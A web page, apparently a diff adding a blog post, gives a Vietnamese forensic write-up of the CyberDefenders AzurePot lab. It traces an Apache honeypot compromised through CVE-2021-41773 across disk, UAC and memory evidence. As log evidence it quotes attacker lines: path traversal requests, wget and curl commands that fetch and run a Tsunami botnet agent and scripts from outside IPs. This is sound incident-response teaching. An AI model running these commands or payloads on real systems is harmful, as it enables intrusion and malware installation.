@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>CyberDefenders - AzurePot Writeup | Duy Nguyen | Security Write-ups</title>
+<meta name="keywords" content="DFIR, Endpoint Forensics, Linux, CyberDefenders, Volatility, FTK Imager">
+<meta name="description" content="Điều tra một honeypot Ubuntu trên Azure bị khai thác CVE-2021-41773: phân tích disk image, UAC và memory dump.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/azurepot/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css" integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/azurepot/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Duy Nguyen | Security Write-ups (Alt + H)">Duy Nguyen | Security Write-ups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberDefenders - AzurePot Writeup
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-09-24 10:00:00 +0700 +07'>24 tháng 9, 2026</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>1171 words</span>
+
+</div>
+  </header> <details class="toc" >
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#t%e1%bb%95ng-quan" aria-label="Tổng quan">Tổng quan</a></li>
+            <li>
+                <a href="#ph%c3%a2n-t%c3%adch" aria-label="Phân tích">Phân tích</a><ul>
+                    
+            <li>
+                <a href="#q1-file--sdbvhd--script-ch%e1%ba%a1y-m%e1%bb%97i-ph%c3%bat-%c4%91%e1%bb%83-d%e1%bb%8dn-d%e1%ba%b9p-t%c3%aan-l%c3%a0-g%c3%ac" aria-label="Q1: File =&gt; sdb.vhd | Script chạy mỗi phút để dọn dẹp tên là gì?">Q1: File =&gt; sdb.vhd | Script chạy mỗi phút để dọn dẹp tên là gì?</a></li>
+            <li>
+                <a href="#q2-file--sdbvhd--script-%e1%bb%9f-q1-kill-process-c%e1%bb%a7a-2-m%c3%a3-%c4%91%e1%bb%99c-%c4%91%c3%a0o-coin-t%c3%aan-file-th%e1%bb%a9-nh%e1%ba%a5t" aria-label="Q2: File =&gt; sdb.vhd | Script ở Q1 kill process của 2 mã độc đào coin. Tên file thứ nhất?">Q2: File =&gt; sdb.vhd | Script ở Q1 kill process của 2 mã độc đào coin. Tên file thứ nhất?</a></li>
+            <li>
+                <a href="#q3-file--sdbvhd--script-%c4%91%e1%bb%95i-quy%e1%bb%81n-c%c3%a1c-file-th%c3%a0nh-g%c3%ac" aria-label="Q3: File =&gt; sdb.vhd | Script đổi quyền các file thành gì?">Q3: File =&gt; sdb.vhd | Script đổi quyền các file thành gì?</a></li>
+            <li>
+                <a href="#q4-file--sdbvhd--sha256-c%e1%bb%a7a-botnet-agent-l%c3%a0-g%c3%ac" aria-label="Q4: File =&gt; sdb.vhd | SHA256 của botnet agent là gì?">Q4: File =&gt; sdb.vhd | SHA256 của botnet agent là gì?</a></li>
+            <li>
+                <a href="#q5-file--sdbvhd--botnet-%e1%bb%9f-q4-t%c3%aan-l%c3%a0-g%c3%ac" aria-label="Q5: File =&gt; sdb.vhd | Botnet ở Q4 tên là gì?">Q5: File =&gt; sdb.vhd | Botnet ở Q4 tên là gì?</a></li>
+            <li>
+                <a href="#q6-file--sdbvhd--ip-n%c3%a0o-kh%e1%bb%9bp-v%e1%bb%9bi-th%e1%bb%9di-%c4%91i%e1%bb%83m-t%e1%ba%a1o-file-botnet-agent" aria-label="Q6: File =&gt; sdb.vhd | IP nào khớp với thời điểm tạo file botnet agent?">Q6: File =&gt; sdb.vhd | IP nào khớp với thời điểm tạo file botnet agent?</a></li>
+            <li>
+                <a href="#q7-file--sdbvhd--attacker-t%e1%ba%a3i-botnet-agent-t%e1%bb%ab-url-n%c3%a0o" aria-label="Q7: File =&gt; sdb.vhd | Attacker tải botnet agent từ URL nào?">Q7: File =&gt; sdb.vhd | Attacker tải botnet agent từ URL nào?</a></li>
+            <li>
+                <a href="#q8-file--sdbvhd--file-attacker-t%e1%ba%a3i-v%e1%bb%81-%c4%91%e1%bb%83-ch%e1%ba%a1y-script-%c4%91%e1%bb%99c-h%e1%ba%a1i-r%e1%bb%93i-t%e1%bb%b1-x%c3%b3a" aria-label="Q8: File =&gt; sdb.vhd | File attacker tải về để chạy script độc hại rồi tự xóa?">Q8: File =&gt; sdb.vhd | File attacker tải về để chạy script độc hại rồi tự xóa?</a></li>
+            <li>
+                <a href="#q9-file--sdbvhd--c%c3%a1c-script-sh-attacker-%c4%91%c3%a3-t%e1%ba%a3i" aria-label="Q9: File =&gt; sdb.vhd | Các script .sh attacker đã tải?">Q9: File =&gt; sdb.vhd | Các script .sh attacker đã tải?</a></li>
+            <li>
+                <a href="#q10-file--uac--hai-process-ch%e1%ba%a1y-t%e1%bb%ab-th%c6%b0-m%e1%bb%a5c-%c4%91%c3%a3-b%e1%bb%8b-x%c3%b3a-pid-l%c3%a0-g%c3%ac" aria-label="Q10: File =&gt; UAC | Hai process chạy từ thư mục đã bị xóa, PID là gì?">Q10: File =&gt; UAC | Hai process chạy từ thư mục đã bị xóa, PID là gì?</a></li>
+            <li>
+                <a href="#q11-file--uac--command-line-c%e1%bb%a7a-pid-th%e1%bb%a9-hai-%e1%bb%9f-q10" aria-label="Q11: File =&gt; UAC | Command line của PID thứ hai ở Q10?">Q11: File =&gt; UAC | Command line của PID thứ hai ở Q10?</a></li>
+            <li>
+                <a href="#q12-file--uac--remote-ip-v%c3%a0-port-d%c3%b9ng-trong-cu%e1%bb%99c-t%e1%ba%a5n-c%c3%b4ng" aria-label="Q12: File =&gt; UAC | Remote IP và port dùng trong cuộc tấn công?">Q12: File =&gt; UAC | Remote IP và port dùng trong cuộc tấn công?</a></li>
+            <li>
+                <a href="#q13-file--uac--user-n%c3%a0o-ch%e1%ba%a1y-l%e1%bb%87nh-%e1%bb%9f-q11" aria-label="Q13: File =&gt; UAC | User nào chạy lệnh ở Q11?">Q13: File =&gt; UAC | User nào chạy lệnh ở Q11?</a></li>
+            <li>
+                <a href="#q14-file--uac--hai-shell-process-ch%e1%ba%a1y-t%e1%bb%ab-th%c6%b0-m%e1%bb%a5c-tmp-pid-l%c3%a0-g%c3%ac" aria-label="Q14: File =&gt; UAC | Hai shell process chạy từ thư mục tmp, PID là gì?">Q14: File =&gt; UAC | Hai shell process chạy từ thư mục tmp, PID là gì?</a></li>
+            <li>
+                <a href="#q15-file--ubuntu20211208mem--mac-address-c%e1%bb%a7a-m%c3%a1y-b%e1%bb%8b-capture" aria-label="Q15: File =&gt; ubuntu.20211208.mem | MAC address của máy bị capture?">Q15: File =&gt; ubuntu.20211208.mem | MAC address của máy bị capture?</a></li>
+            <li>
+                <a href="#q16-file--ubuntu20211208mem--trong-bash-history-attacker-t%e1%ba%a3i-script-sh-n%c3%a0o" aria-label="Q16: File =&gt; ubuntu.20211208.mem | Trong bash history, attacker tải script .sh nào?">Q16: File =&gt; ubuntu.20211208.mem | Trong bash history, attacker tải script .sh nào?</a></li></ul>
+            </li>
+            <li>
+                <a href="#t%e1%bb%95ng-k%e1%ba%bft" aria-label="Tổng kết">Tổng kết</a>
+            </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><h2 id="tổng-quan">Tổng quan<a hidden class="anchor" aria-hidden="true" href="#tổng-quan">#</a></h2>
+<p>Lab AzurePot mô phỏng một honeypot Ubuntu chạy Apache trên Azure, cố tình để lộ lỗ hổng <strong>CVE-2021-41773</strong> (path traversal dẫn tới RCE). Máy bị nhiều nhóm tấn công nhắm tới, chủ yếu là mã độc đào coin và botnet. Đề bài cho 3 artifact:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Artifact</th>
+					<th>Nội dung</th>
+					<th>Dùng để</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>sdb.vhd</code></td>
+					<td>Snapshot ổ đĩa</td>
+					<td>Xem cron, log Apache, file mã độc</td>
+			</tr>
+			<tr>
+					<td><code>uac.tgz</code></td>
+					<td>Kết quả thu thập của Unix Artifact Collector</td>
+					<td>Xem process, environ, user</td>
+			</tr>
+			<tr>
+					<td><code>ubuntu.20211208.mem</code></td>
+					<td>Memory dump (LiME)</td>
+					<td>Xem interface mạng, bash history</td>
+			</tr>
+	</tbody>
+</table>
+<p><strong>Công cụ:</strong> FTK Imager, Notepad++, grep/awk, Volatility 2, CyberChef, VirusTotal.</p>
+<hr>
+<h2 id="phân-tích">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích">#</a></h2>
+<h3 id="q1-file--sdbvhd--script-chạy-mỗi-phút-để-dọn-dẹp-tên-là-gì">Q1: File =&gt; sdb.vhd | Script chạy mỗi phút để dọn dẹp tên là gì?<a hidden class="anchor" aria-hidden="true" href="#q1-file--sdbvhd--script-chạy-mỗi-phút-để-dọn-dẹp-tên-là-gì">#</a></h3>
+<p>Mình mount <code>sdb.vhd</code> bằng FTK Imager ở chế độ <strong>File System / Read Only</strong> để không làm thay đổi bằng chứng.</p>
+<p><img alt="FTK Imager Mount" loading="lazy" src="/images/1.png"></p>
+<p>Sau khi mount, vào <code>var/spool/cron/crontabs</code> sẽ thấy file <code>root</code>, tức crontab của user root.</p>
+<p><img alt="Cron Root File" loading="lazy" src="/images/2.png"></p>
+<p>Mở file bằng Notepad++, dòng có 5 dấu <code>*</code> nghĩa là chạy mỗi phút:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* * * * * /root/.remove.sh
+</span></span></code></pre></div><p><img alt="Nội dung crontab" loading="lazy" src="/images/3.png"></p>
+<p><strong>Đáp án:</strong> <code>.remove.sh</code></p>
+<hr>
+<h3 id="q2-file--sdbvhd--script-ở-q1-kill-process-của-2-mã-độc-đào-coin-tên-file-thứ-nhất">Q2: File =&gt; sdb.vhd | Script ở Q1 kill process của 2 mã độc đào coin. Tên file thứ nhất?<a hidden class="anchor" aria-hidden="true" href="#q2-file--sdbvhd--script-ở-q1-kill-process-của-2-mã-độc-đào-coin-tên-file-thứ-nhất">#</a></h3>
+<p>Mở <code>/root/.remove.sh</code>, vòng <code>for</code> đầu tiên lọc process theo tên rồi <code>kill -9</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> PID in <span style="color:#e6db74">`</span>ps -ef | egrep <span style="color:#e6db74">&#34;kinsing|kdevtmp&#34;</span> | grep <span style="color:#e6db74">&#34;/tmp&#34;</span> | awk <span style="color:#e6db74">&#39;{ print $2 }&#39;</span><span style="color:#e6db74">`</span>
+</span></span></code></pre></div><p><img alt="Nội dung .remove.sh" loading="lazy" src="/images/4.png"></p>
+<p>Hai tên bị nhắm tới là <code>kinsing</code> và <code>kdevtmp</code>.</p>
+<p><strong>Đáp án:</strong> <code>kinsing</code></p>
+<hr>
+<h3 id="q3-file--sdbvhd--script-đổi-quyền-các-file-thành-gì">Q3: File =&gt; sdb.vhd | Script đổi quyền các file thành gì?<a hidden class="anchor" aria-hidden="true" href="#q3-file--sdbvhd--script-đổi-quyền-các-file-thành-gì">#</a></h3>
+<p>Cũng trong <code>.remove.sh</code>, sau khi kill process thì script chạy:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chown root:root /tmp/k*
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">444</span> /tmp/k*
+</span></span></code></pre></div><p><img alt="chown và chmod" loading="lazy" src="/images/5.png"></p>
+<p><code>444</code> = chỉ đọc cho owner, group và others. Không ai có quyền ghi hay thực thi, nên mã độc trong <code>/tmp/k*</code> không chạy lại được.</p>
+<p><strong>Đáp án:</strong> <code>444</code></p>
+<hr>
+<h3 id="q4-file--sdbvhd--sha256-của-botnet-agent-là-gì">Q4: File =&gt; sdb.vhd | SHA256 của botnet agent là gì?<a hidden class="anchor" aria-hidden="true" href="#q4-file--sdbvhd--sha256-của-botnet-agent-là-gì">#</a></h3>
+<p><strong>Bước 1: Xác nhận bị khai thác CVE-2021-41773.</strong> Trong <code>/var/log/apache2/access_log</code> có nhiều request dạng path traversal mã hóa <code>%2e</code>, ví dụ:</p>
+<pre tabindex="0"><code>/cgi-bin/.%2e/%2e/%2e/%2e/etc/passwd
+/cgi-bin/.%2e/%2e/%2e/%2e/bin/sh
+</code></pre><p>Các POST từ <code>176.10.99.200</code> trả về <strong>200 OK</strong>, tức RCE đã thành công.</p>
+<p><img alt="Access log" loading="lazy" src="/images/6.png"></p>
+<p><strong>Bước 2: Tìm hành vi sau khai thác.</strong> Grep <code>chmod</code> trong <code>error_log</code> thì thấy attacker dùng <code>wget</code> tải file <code>dk86</code> về <code>/tmp</code>, cấp quyền thực thi rồi chạy.</p>
+<p><img alt="Error log" loading="lazy" src="/images/7.png"></p>
+<p>File sau đó được chuyển sang <code>/var/tmp</code> (thư mục này không bị xóa khi reboot).</p>
+<p><img alt="dk86 trong /var/tmp" loading="lazy" src="/images/8.png"></p>
+<p><strong>Bước 3: Tính hash.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sha256sum dk86
+</span></span></code></pre></div><pre tabindex="0"><code>0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049
+</code></pre><p><img alt="sha256sum" loading="lazy" src="/images/9.png"></p>
+<p>Kiểm tra trên VirusTotal: file ELF, bị nhiều engine gắn nhãn trojan.</p>
+<p><img alt="VirusTotal" loading="lazy" src="/images/10.png"></p>
+<p><strong>Đáp án:</strong> <code>0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049</code></p>
+<hr>
+<h3 id="q5-file--sdbvhd--botnet-ở-q4-tên-là-gì">Q5: File =&gt; sdb.vhd | Botnet ở Q4 tên là gì?<a hidden class="anchor" aria-hidden="true" href="#q5-file--sdbvhd--botnet-ở-q4-tên-là-gì">#</a></h3>
+<p>Phần <em>Popular threat label / Family labels</em> trên VirusTotal ghi <code>tsunami</code>, <code>iznqt</code>, <code>kaiten</code>; nhiều AV gọi là <code>Backdoor.Linux.Tsunami</code> hoặc <code>ELF:Tsunami</code>. Đây là botnet DDoS trên Linux.</p>
+<p><img alt="Family labels" loading="lazy" src="/images/11.png"></p>
+<p><strong>Đáp án:</strong> <code>Tsunami</code></p>
+<hr>
+<h3 id="q6-file--sdbvhd--ip-nào-khớp-với-thời-điểm-tạo-file-botnet-agent">Q6: File =&gt; sdb.vhd | IP nào khớp với thời điểm tạo file botnet agent?<a hidden class="anchor" aria-hidden="true" href="#q6-file--sdbvhd--ip-nào-khớp-với-thời-điểm-tạo-file-botnet-agent">#</a></h3>
+<p>Xem timestamp tạo file <code>dk86</code> (11/11/2021 lúc 19:07), rồi đối chiếu với các dòng <code>wget</code> trong <code>error_log</code> cùng thời điểm.</p>
+<p><img alt="Timestamp file dk86" loading="lazy" src="/images/12.png"></p>
+<p><img alt="Error log khớp thời gian" loading="lazy" src="/images/13.png"></p>
+<p>IP thực hiện lệnh là <code>141.135.85.36</code> (xuất hiện lặp lại với nhiều source port khác nhau).</p>
+<p><strong>Đáp án:</strong> <code>141.135.85.36</code></p>
+<hr>
+<h3 id="q7-file--sdbvhd--attacker-tải-botnet-agent-từ-url-nào">Q7: File =&gt; sdb.vhd | Attacker tải botnet agent từ URL nào?<a hidden class="anchor" aria-hidden="true" href="#q7-file--sdbvhd--attacker-tải-botnet-agent-từ-url-nào">#</a></h3>
+<p>Lệnh nằm trong <code>error_log</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86;
+</span></span></code></pre></div><p><img alt="Lệnh wget" loading="lazy" src="/images/14.png"></p>
+<p>Đường dẫn <code>wp-content/themes/twentysixteen</code> cho thấy khả năng một site WordPress khác đã bị chiếm để làm nơi chứa mã độc.</p>
+<p><strong>Đáp án:</strong> <code>http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86</code></p>
+<hr>
+<h3 id="q8-file--sdbvhd--file-attacker-tải-về-để-chạy-script-độc-hại-rồi-tự-xóa">Q8: File =&gt; sdb.vhd | File attacker tải về để chạy script độc hại rồi tự xóa?<a hidden class="anchor" aria-hidden="true" href="#q8-file--sdbvhd--file-attacker-tải-về-để-chạy-script-độc-hại-rồi-tự-xóa">#</a></h3>
+<p>Mình lọc bỏ các URL quen thuộc (Google, Microsoft&hellip;) khỏi log và thấy một URL đáng ngờ:</p>
+<pre tabindex="0"><code>http://116.203.212.184/1010/b64.php
+</code></pre><p><img alt="URL b64.php" loading="lazy" src="/images/15.png"></p>
+<p>Lệnh gọi tới nó:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s http://116.203.212.184/1010/b64.php -u client:%@123-456%@ --data-urlencode <span style="color:#e6db74">&#34;s=&lt;Base64_String&gt;&#34;</span> | sh
+</span></span></code></pre></div><p><img alt="Lệnh curl" loading="lazy" src="/images/16.png"></p>
+<p>Chuỗi base64 được pipe thẳng vào <code>sh</code>. Giải mã bằng CyberChef:</p>
+<ul>
+<li>
+<p>Chuỗi thứ nhất: tải thêm script khác về chạy.</p>
+<p><img alt="CyberChef 1" loading="lazy" src="/images/17.png"></p>
+</li>
+<li>
+<p>Chuỗi thứ hai: có lệnh xóa dấu vết <code>rm -rf .install</code>.</p>
+<p><img alt="CyberChef 2" loading="lazy" src="/images/18.png"></p>
+</li>
+</ul>
+<p><strong>Đáp án:</strong> <code>b64.php</code></p>
+<hr>
+<h3 id="q9-file--sdbvhd--các-script-sh-attacker-đã-tải">Q9: File =&gt; sdb.vhd | Các script <code>.sh</code> attacker đã tải?<a hidden class="anchor" aria-hidden="true" href="#q9-file--sdbvhd--các-script-sh-attacker-đã-tải">#</a></h3>
+<p>Grep <code>.sh</code> trong log:</p>
+<p><img alt="Grep .sh" loading="lazy" src="/images/19.png"></p>
+<table>
+	<thead>
+			<tr>
+					<th>Script</th>
+					<th>Nguồn</th>
+					<th>Cách chạy</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>ap.sh</code></td>
+					<td><code>45.137.155.55</code></td>
+					<td><code>curl -s ... | bash</code> hoặc <code>wget -q -O - ... | bash</code> (chạy trực tiếp, không lưu file)</td>
+			</tr>
+			<tr>
+					<td><code>0_cron.sh</code></td>
+					<td><code>103.55.36.245</code></td>
+					<td><code>wget</code> → <code>chmod 777</code> → <code>sh</code></td>
+			</tr>
+			<tr>
+					<td><code>0_linux.sh</code></td>
+					<td><code>103.55.36.245</code></td>
+					<td><code>wget</code> → <code>chmod 777</code> → <code>sh</code></td>
+			</tr>
+	</tbody>
+</table>
+<p><strong>Đáp án:</strong> <code>ap.sh</code>, <code>0_cron.sh</code>, <code>0_linux.sh</code></p>
+<hr>
+<h3 id="q10-file--uac--hai-process-chạy-từ-thư-mục-đã-bị-xóa-pid-là-gì">Q10: File =&gt; UAC | Hai process chạy từ thư mục đã bị xóa, PID là gì?<a hidden class="anchor" aria-hidden="true" href="#q10-file--uac--hai-process-chạy-từ-thư-mục-đã-bị-xóa-pid-là-gì">#</a></h3>
+<p>Trong dữ liệu process của UAC, grep từ khóa <code>deleted</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -r <span style="color:#e6db74">&#34;deleted&#34;</span> .
+</span></span></code></pre></div><p><img alt="Grep deleted" loading="lazy" src="/images/20.png"></p>
+<p>Có hai process cùng chạy từ <code>/tmp/.log/101068 (deleted)</code>, tức file thực thi đã bị xóa nhưng process vẫn còn sống trong bộ nhớ, một dấu hiệu kinh điển của mã độc.</p>
+<p><strong>Đáp án:</strong> <code>6388</code>, <code>20645</code></p>
+<hr>
+<h3 id="q11-file--uac--command-line-của-pid-thứ-hai-ở-q10">Q11: File =&gt; UAC | Command line của PID thứ hai ở Q10?<a hidden class="anchor" aria-hidden="true" href="#q11-file--uac--command-line-của-pid-thứ-hai-ở-q10">#</a></h3>
+<p>Tra PID <code>20645</code> trong dữ liệu process:</p>
+<p><img alt="Command line PID 20645" loading="lazy" src="/images/21.png"></p>
+<p>Đó là <code>sh .src.sh</code>: một script ẩn (tên bắt đầu bằng dấu chấm) nằm trong <code>/var/tmp/.log/101068/</code> và đã bị xóa.</p>
+<p><strong>Đáp án:</strong> <code>sh .src.sh</code></p>
+<hr>
+<h3 id="q12-file--uac--remote-ip-và-port-dùng-trong-cuộc-tấn-công">Q12: File =&gt; UAC | Remote IP và port dùng trong cuộc tấn công?<a hidden class="anchor" aria-hidden="true" href="#q12-file--uac--remote-ip-và-port-dùng-trong-cuộc-tấn-công">#</a></h3>
+<p>UAC lưu biến môi trường của từng process trong <code>environ.txt</code>. Mở file của PID <code>20645</code> và tìm <code>REMOTE_ADDR</code> / <code>REMOTE_PORT</code>:</p>
+<p><img alt="environ.txt" loading="lazy" src="/images/22.png"></p>
+<p><strong>Đáp án:</strong> <code>116.202.187.77:56590</code></p>
+<hr>
+<h3 id="q13-file--uac--user-nào-chạy-lệnh-ở-q11">Q13: File =&gt; UAC | User nào chạy lệnh ở Q11?<a hidden class="anchor" aria-hidden="true" href="#q13-file--uac--user-nào-chạy-lệnh-ở-q11">#</a></h3>
+<p>Đối chiếu PID <code>20645</code> trong <code>ps-ef.txt</code> (hoặc <code>running_processes_full_paths.txt</code>):</p>
+<p><img alt="User chạy process" loading="lazy" src="/images/23.png"></p>
+<p>Process chạy dưới user <code>daemon</code>, đúng với việc Apache thường chạy bằng tài khoản này, hợp lý vì attacker đi vào qua RCE của web server.</p>
+<p><strong>Đáp án:</strong> <code>daemon</code></p>
+<hr>
+<h3 id="q14-file--uac--hai-shell-process-chạy-từ-thư-mục-tmp-pid-là-gì">Q14: File =&gt; UAC | Hai shell process chạy từ thư mục tmp, PID là gì?<a hidden class="anchor" aria-hidden="true" href="#q14-file--uac--hai-shell-process-chạy-từ-thư-mục-tmp-pid-là-gì">#</a></h3>
+<p>Xem thư mục <code>live_response/process</code> của UAC, lọc các process <code>sh</code> có đường dẫn trong <code>/tmp</code>:</p>
+<p><img alt="Shell chạy từ /tmp" loading="lazy" src="/images/24.png"></p>
+<p><strong>Đáp án:</strong> <code>15853</code>, <code>21785</code></p>
+<hr>
+<h3 id="q15-file--ubuntu20211208mem--mac-address-của-máy-bị-capture">Q15: File =&gt; ubuntu.20211208.mem | MAC address của máy bị capture?<a hidden class="anchor" aria-hidden="true" href="#q15-file--ubuntu20211208mem--mac-address-của-máy-bị-capture">#</a></h3>
+<p>Với Volatility 2, trước hết phải tự tạo một <strong>Linux profile</strong> khớp với kernel của máy Ubuntu bị capture (hướng dẫn tạo profile xem ở <a href="https://beguier.eu/nicolas/articles/security-tips-3-volatility-linux-profiles.html">bài blog này</a>). Có profile rồi thì dùng plugin <code>linux_ifconfig</code> để lấy thông tin card mạng (IP, MAC, trạng thái) từ memory dump.</p>
+<p><img alt="linux_ifconfig" loading="lazy" src="/images/25.png"></p>
+<p>Interface <code>lo</code> là loopback (MAC toàn số 0), còn <code>eth0</code> (<code>10.0.0.4</code>) là card mạng chính.</p>
+<p><strong>Đáp án:</strong> <code>00:22:48:26:3b:16</code></p>
+<hr>
+<h3 id="q16-file--ubuntu20211208mem--trong-bash-history-attacker-tải-script-sh-nào">Q16: File =&gt; ubuntu.20211208.mem | Trong bash history, attacker tải script <code>.sh</code> nào?<a hidden class="anchor" aria-hidden="true" href="#q16-file--ubuntu20211208mem--trong-bash-history-attacker-tải-script-sh-nào">#</a></h3>
+<p>Dùng plugin <code>linux_bash</code> (cùng profile đã tạo ở Q15) để khôi phục lịch sử lệnh bash còn nằm trong bộ nhớ, rồi lọc các lệnh <code>wget</code> / <code>curl</code>.</p>
+<p><img alt="linux_bash" loading="lazy" src="/images/26.png"></p>
+<p>Attacker đã dùng <code>wget</code> tải <code>unk.sh</code> từ <code>185.191.32.198</code>.</p>
+<p><strong>Đáp án:</strong> <code>unk.sh</code></p>
+<hr>
+<h2 id="tổng-kết">Tổng kết<a hidden class="anchor" aria-hidden="true" href="#tổng-kết">#</a></h2>
+<p><strong>Chuỗi tấn công:</strong></p>
+<ol>
+<li>Khai thác <strong>CVE-2021-41773</strong> trên Apache để có RCE.</li>
+<li>Tải và chạy botnet agent <code>dk86</code> (Tsunami), cùng nhiều script <code>.sh</code> khác.</li>
+<li>Dùng <code>curl ... | sh</code> với payload base64 để giấu nội dung và tự xóa dấu vết.</li>
+<li>Chạy process từ file đã bị xóa (<code>/tmp/.log/101068</code>) để né phát hiện.</li>
+</ol>
+<p><strong>IOC chính:</strong></p>
+<table>
+	<thead>
+			<tr>
+					<th>Loại</th>
+					<th>Giá trị</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>SHA256 <code>dk86</code></td>
+					<td><code>0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049</code></td>
+			</tr>
+			<tr>
+					<td>Host tải malware</td>
+					<td><code>138.197.206.223</code>, <code>116.203.212.184</code>, <code>45.137.155.55</code>, <code>103.55.36.245</code>, <code>185.191.32.198</code></td>
+			</tr>
+			<tr>
+					<td>IP tấn công</td>
+					<td><code>176.10.99.200</code>, <code>141.135.85.36</code>, <code>116.202.187.77</code></td>
+			</tr>
+			<tr>
+					<td>File/Script</td>
+					<td><code>dk86</code>, <code>b64.php</code>, <code>ap.sh</code>, <code>0_cron.sh</code>, <code>0_linux.sh</code>, <code>unk.sh</code>, <code>.src.sh</code></td>
+			</tr>
+	</tbody>
+</table>
+<p><strong>Bài học:</strong> Kết hợp ba nguồn (disk, UAC, memory) cho bức tranh đầy đủ hơn hẳn từng nguồn riêng lẻ. Disk cho thấy log và file, UAC cho thấy trạng thái process lúc thu thập, memory lưu lại những thứ attacker đã cố xóa.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
